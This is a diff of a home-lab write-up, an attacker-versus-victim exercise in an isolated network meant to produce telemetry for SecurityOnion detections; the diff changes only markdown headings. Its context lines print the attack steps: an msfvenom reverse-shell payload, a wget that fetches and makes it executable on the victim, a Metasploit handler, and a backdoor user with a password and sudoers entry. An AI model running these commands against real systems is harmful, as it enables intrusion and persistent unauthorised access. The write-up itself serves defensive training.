@@ -8,10 +8,10 @@ Status: In Progress (Defender / SecurityOnion phase next)
 ---
 
 
-- Objective
+### Objective
 Build isolated attacker <> victim lab to demonstrate reconnaissance, initial access, execution, persistence, and privilege escalation — then add a defender (SecurityOnion) to capture telemetry and create detections.
 
-- Architecture and Scope
+### Architecture and Scope
 "lab_attacker" - Kali Linux(Internal Network(labnet)/NAT)IP 10.10.10.10
 "lab_victim" - Ubuntu Linux(Internal Network(labnet)/Internal Network(intnet))IP 10.10.10.20
 "Network" - Internal Network only(Isolated)
@@ -35,27 +35,27 @@ nmap -sS -sV 10.10.10.20
 
   ## INITIAL ACCESS AND EXECUTION
 
- - Summary
+ ### Summary
 Created a small Linux meterpreter ELF payload on attacker host, served it via HTTP server, fetched and executed it on the victim, then handled the incoming meterpreter session from Metasploit.
 
- - Artifacts / screenshots
+ ### Artifacts / screenshots
 Payload creation: 'evidence/2025-10-27_15-32-08_Payload_Creation_Initial_Access_Execution.png'
 Serving payload: 'evidence/2025-10-27_15-38-08_Serving_Payload_Initial_Access_Execution.png'
 Payload downloaded on victim: 'evidence/2025-10-27_15-42-04_Payload_On_Victim_Initial_Access_Execution.png'
 Exploit/run and handler: 'evidence/2025-10-27_15-47-45_Exploit_Run_And_Waiting_Initial_Access_Execution.png'
 Successful execution(meterpreter/shell proof)- 'evidence/2025-10-27_15-58-31_Successful-Execution_Initial-Access-Execution.png'
 
- - What I did
+ ### What I did
 Generated a Linux ELF reverse-TCP payload on the attacker:
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -O shell32.elf
 
- - Served the payload from attacker
+ ### Served the payload from attacker
 python3 -m http.server 8000 --bind 10.10.10.10
 
- - On the victim fetched and executed it 
+ ### On the victim fetched and executed it 
 wget http://10.10.10.10:8000/shell32.elf -O /tmp/shell && chmod +x /tmp/shell
 
- - Started a multi handler on Metasploit
+ ### Started a multi handler on Metasploit
 use exploit/multi/handler
 set PAYLOAD linux/x64/meterpreter/reverse_tcp
 set LHOST 10.10.10.10
@@ -67,13 +67,13 @@ set LPORT 4444
 
    ## PERSISTANCE
    
- - Summary
+ ### Summary
 To demonstrate persistance detection and to create realistic defender telemetry for the upcoming SecurityOnion phase, a benign backdoor user was created and a sudoers entry added. All were documented and snapshot was reverted.
 
- - Artifacts / Screenshots
+ ### Artifacts / Screenshots
 -Persistance (new user created): 'evidence/2025-10-27_17-59-25_Persistance-New-User_Persistance.png'
 
- - Commands Executed
+ ### Commands Executed
 sudo useradd -, -s /bin/bash backdoor_user //Creating a new user
 echo 'backdoor_user:P@ssword123!' | sudo chpasswd //Setting a password
 
@@ -88,13 +88,13 @@ sudo chmod 440 /etc/sudoers.d/backdoor_user
 
    ## PRIVILEGE ESCALATION
    
- - Summary
+ ### Summary
 After intitial access, local privilege escalation was demonstrated - minimal proof (whoami / id) captured to validate root access. This was performed only to verify impact for detection engineering.
 
- - Artifact / Screenshot
+ ### Artifact / Screenshot
 -Privilege escalation(root obtained): 'evidence/2025-10-27_18-49-33_Privilege-Escalation.png'
 
- - Proof commands / notes
+ ### Proof commands / notes
 // From the interactive shell on meterpreter > shell
 whoami
 id
@@ -107,7 +107,7 @@ whoami //lead to root
 ---
 
 
-   ## CONCLUSION
+   ### CONCLUSION
 
 This lab demonstrated a complete attacker workflow in an isolated environment: reconnaissance, payload creation and delivery, successful remote code execution, a persistence demonstration, and local privilege escalation (proof-of-concept). The aim was not to cause damage but to produce realistic telemetry and artifacts that a defender can use to tune detections and playbook responses.
 
